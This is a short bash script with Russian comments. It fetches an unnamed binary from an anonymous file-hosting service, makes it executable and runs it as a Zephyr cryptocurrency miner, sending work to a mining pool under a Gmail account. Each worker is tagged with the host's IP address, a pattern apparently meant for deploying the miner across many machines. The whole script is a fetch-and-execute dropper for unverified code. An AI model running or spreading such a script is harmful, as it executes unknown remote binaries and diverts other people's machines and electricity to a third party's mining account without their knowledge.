#!/bin/bash

# Шаг 1: Загрузка файла с помощью wget
wget https://files.catbox.moe/ccqaq0

# Проверка успешности загрузки файла
if [ $? -ne 0 ]; then
    echo "Ошибка: Не удалось загрузить файл."
    exit 1
fi

# Шаг 2: Делаем файл исполняемым
chmod +x ccqaq0

# Шаг 3: Получаем IP-адрес хоста
host_ip=$(hostname -I)

# Проверка наличия IP-адреса
if [ -z "$host_ip" ]; then
    echo "Ошибка: Не удалось получить IP-адрес хоста."
    exit 1
fi

# Шаг 4: Запускаем ccqaq0 с указанными параметрами
./ccqaq0 -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/$host_ip -k --coin zephyr -a rx/0

# Успешное завершение скрипта
exit 0
